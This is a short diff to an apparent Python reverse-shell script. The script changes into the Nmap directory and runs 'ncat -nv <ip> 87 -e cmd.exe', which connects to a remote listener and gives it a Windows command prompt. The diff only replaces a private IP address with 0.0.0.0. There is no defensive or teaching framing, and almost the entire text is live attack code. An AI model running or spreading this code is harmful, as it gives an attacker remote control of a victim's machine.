@@ -4,4 +4,4 @@ import os
 os.chdir("C:/Program Files (x86)/Nmap/")
 
 # Input IP Address & Port Number where listener is set up 
-os.system('cmd /k "ncat -nv 192.168.1.8 87 -e cmd.exe"')
+os.system('cmd /k "ncat -nv 0.0.0.0 87 -e cmd.exe"')
